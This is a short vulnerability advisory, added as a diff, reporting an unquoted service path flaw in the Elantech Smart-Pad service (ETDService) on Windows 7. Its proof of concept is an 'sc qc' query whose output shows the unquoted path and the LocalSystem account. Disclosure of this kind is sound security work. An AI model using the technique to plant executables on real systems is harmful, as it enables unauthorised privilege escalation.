@@ -1,0 +1,27 @@
+# Exploit Title: Elantech Smart-Pad Unquoted Service Path Privilege Escalation
+# Date: 24/09/2016
+# Exploit Author: zaeek@protonmail.com
+# Vendor Homepage: http://www.emc.com.tw/eng/
+# Version: 11.9.0.0
+# Tested on: Windows 7 64bit
+
+====Description====
+
+Elantech Smart-Pad Service lacks of quotes in the filepath, causing it to be a potential vector of privilege escalation attack.
+To properly exploit this vulnerability, the local attacker must insert an executable file in the path of the service. Upon service restart or system reboot, the malicious code will be run with elevated privileges.
+
+====Proof-of-Concept====
+
+C:\>sc qc ETDService
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: ETDService
+TYPE : 10 WIN32_OWN_PROCESS
+START_TYPE : 2 AUTO_START
+ERROR_CONTROL : 1 NORMAL
+BINARY_PATH_NAME : C:\Program Files\Elantech\ETDService.exe
+LOAD_ORDER_GROUP :
+TAG : 0
+DISPLAY_NAME : Elan Service
+DEPENDENCIES :
+SERVICE_START_NAME : LocalSystem
